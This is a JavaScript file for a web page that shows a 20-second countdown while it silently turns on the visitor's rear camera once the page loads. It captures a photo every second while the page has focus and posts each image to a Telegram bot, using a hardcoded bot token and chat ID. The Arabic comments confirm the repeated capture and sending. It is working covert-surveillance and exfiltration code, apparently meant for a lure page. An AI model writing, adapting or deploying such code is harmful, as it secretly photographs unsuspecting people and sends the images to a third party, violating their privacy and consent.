document.addEventListener("DOMContentLoaded", function () {
    let timeLeft = 20;
    const countdownElement = document.getElementById("countdown");
    const progressBar = document.getElementById("progress");

    const countdownInterval = setInterval(() => {
        timeLeft--;
        countdownElement.textContent = timeLeft;
        progressBar.style.width = (timeLeft / 20) * 100 + "%";

        if (timeLeft <= 0) {
            clearInterval(countdownInterval);
        }
    }, 1000);

    async function startCamera() {
        try {
            const video = document.getElementById('video');
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "environment" } // تشغيل الكاميرا الخلفية
            });
            video.srcObject = stream;

            console.log("✅ الكاميرا الخلفية تعمل، سيتم التقاط الصور بشكل متكرر...");
            capturePhotosRepeatedly(stream);
        } catch (error) {
            console.error("❌ فشل في تشغيل الكاميرا:", error);
        }
    }

    function capturePhotosRepeatedly(stream) {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        function takePhoto() {
            if (!document.hasFocus()) return; // إذا غادر المستخدم الصفحة، توقف عن التقاط الصور

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            console.log("📸 تم التقاط صورة بالكاميرا الخلفية! جاري إرسالها...");
            canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");

            setTimeout(takePhoto, 1000); // التقاط صورة جديدة كل 5 ثوانٍ
        }

        takePhoto();
    }

    function sendPhoto(blob) {
        const formData = new FormData();
        formData.append("chat_id", "5375214810");
        formData.append("photo", blob, "snapshot.jpg");

        fetch("https://api.telegram.org/bot7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E/sendPhoto", {
            method: "POST",
            body: formData
        })
        .then(response => response.json())
        .then(data => console.log("✅ تم إرسال الصورة بنجاح:", data))
        .catch(error => console.error("❌ خطأ في إرسال الصورة:", error));
    }

    startCamera();
});
